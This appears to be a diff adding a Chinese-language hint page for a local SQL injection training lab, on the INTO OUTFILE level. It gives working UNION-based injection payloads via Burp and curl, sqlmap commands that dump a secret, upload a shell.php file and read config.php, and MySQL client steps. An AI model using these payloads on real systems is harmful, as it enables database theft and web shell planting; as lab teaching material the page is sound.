@@ -1,0 +1,53 @@
+<h4>Burp Suite（手工验证）</h4>
+<p>本关 payload 较长且包含引号与斜杠，建议在 Burp Repeater 里操作：抓 <code>/modules/sqli/outfile.php?id=1</code> 的请求 → 右键 Send to Repeater → 修改 <code>id</code> 参数 → Send。响应中的 SQL 回显与 MySQL 错误码可直接判断写入是否成功。</p>
+<pre>
+# 原始请求（示例）
+GET /bafanglab/modules/sqli/outfile.php?id=1 HTTP/1.1
+Host: localhost
+
+# 替换为（URL 编码后的 payload）
+GET /bafanglab/modules/sqli/outfile.php?id=-1%20UNION%20SELECT%201,(SELECT%20secret%20FROM%20secrets%20WHERE%20id=1),3,4%20INTO%20OUTFILE%20'{{BASE_DIR}}/modules/sqli/files/flag.txt' HTTP/1.1
+Host: localhost
+</pre>
+
+<h4>sqlmap（自动化）</h4>
+<p>sqlmap 支持直接查询、上传文件（写文件）与读取文件：</p>
+<pre>
+# 1. 基本探测
+sqlmap -u "{{SITE}}/modules/sqli/outfile.php?id=1" --batch
+
+# 2. 执行自定义 SQL（读取配置文件 / 通关凭证）
+sqlmap -u "{{SITE}}/modules/sqli/outfile.php?id=1" --sql-query "SELECT secret FROM secrets WHERE id=1" --batch
+
+# 3. 查询当前文件配置
+sqlmap -u "{{SITE}}/modules/sqli/outfile.php?id=1" --sql-query "SELECT @@secure_file_priv" --batch
+
+# 4. 上传本地文件到服务器（底层使用 INTO OUTFILE）
+sqlmap -u "{{SITE}}/modules/sqli/outfile.php?id=1" --file-write "shell.php" --file-dest "{{BASE_DIR}}/modules/sqli/files/shell.php" --batch
+
+# 5. 读取服务器文件（底层使用 LOAD_FILE）
+sqlmap -u "{{SITE}}/modules/sqli/outfile.php?id=1" --file-read "{{BASE_DIR}}/config.php" --batch
+
+# 6. 仅用 UNION 技术，减少请求噪音
+sqlmap -u "{{SITE}}/modules/sqli/outfile.php?id=1" --technique=U --batch
+</pre>
+<p><b>说明：</b><code>--file-write</code> / <code>--file-dest</code> 需要目标数据库账号具备 <code>FILE</code> 权限，且目标路径落在 <code>secure_file_priv</code> 允许目录内，否则 sqlmap 会提示写入失败。</p>
+
+<h4>curl（命令行复现）</h4>
+<pre>
+# 写入 flag 文件（注意对单引号、空格做 URL 编码）
+curl "{{SITE}}/modules/sqli/outfile.php?id=-1%20UNION%20SELECT%201,(SELECT%20secret%20FROM%20secrets%20WHERE%20id=1),3,4%20INTO%20OUTFILE%20'{{BASE_DIR}}/modules/sqli/files/flag.txt'"
+
+# 直接读取写入结果
+curl "{{SITE}}/modules/sqli/files/flag.txt"
+</pre>
+
+<h4>MySQL 客户端（本地对照实验）</h4>
+<pre>
+mysql --host=127.0.0.1 --port=3306 --user=root --password=root --default-character-set=utf8
+SELECT @@secure_file_priv, @@version_compile_os, @@datadir;
+SELECT 1,(SELECT secret FROM bafanglab.secrets WHERE id=1),3,4
+# 下面两行把「安装路径」替换为你本机的部署路径（正斜杠），如 D:/phpStudy/WWW/bafanglab
+INTO OUTFILE '安装路径/modules/sqli/files/flag.txt';
+SELECT LOAD_FILE('安装路径/modules/sqli/files/flag.txt');
+</pre>
